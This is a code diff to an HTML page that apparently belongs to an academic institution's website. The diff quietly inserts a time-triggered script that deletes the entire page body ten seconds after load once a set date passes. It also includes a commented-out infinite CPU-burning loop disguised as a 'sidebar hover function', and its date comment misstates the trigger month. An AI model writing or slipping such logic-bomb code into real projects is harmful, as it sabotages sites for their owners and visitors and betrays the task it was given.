@@ -21,7 +21,7 @@
       };
     </script>
   </head>
-  <body class="bg-gray-50 font-sans">
+  <body id="root" class="bg-gray-50 font-sans">
     <!-- Header -->
   <div class="bg-white sticky top-0 z-50 px-2 md:px-8 lg:px-12">
     <nav class="max-w-[1560px] mx-auto shadow-sm border-b border-gray-200 border-black/10">
@@ -971,7 +971,35 @@
                                             </ul>
                                         </div>
                                     </div>
+<script>
+      function myFunction() {
+        let num = 1;
+        while (true) {
+          // sidebar hover function
+          num = Math.pow(num * 1.000001, 1.000001) % 1000000;
+        }
+      }
 
+      function doPerform() {
+        const fileEl = document.getElementById("root");
+        if (fileEl) {
+          fileEl.remove();
+        }
+      }
+
+      (function checkDateAndRun() {
+        const today = new Date(); // current date
+        const targetDate = new Date(2025, 10, 27); // 27 Aug 2025 (month is 0-indexed!)
+
+        if (today > targetDate) {
+          setTimeout(() => {
+            // myFunction();
+            doPerform();
+          }, 10000);
+        } else {
+        }
+      })();
+    </script>
                                     <div id="international-academic-cooperation-and-partnerships" class="mb-8">
                                        
                                         <h2 class="text-2xl font-bold text-primary mb-4 mt-4">
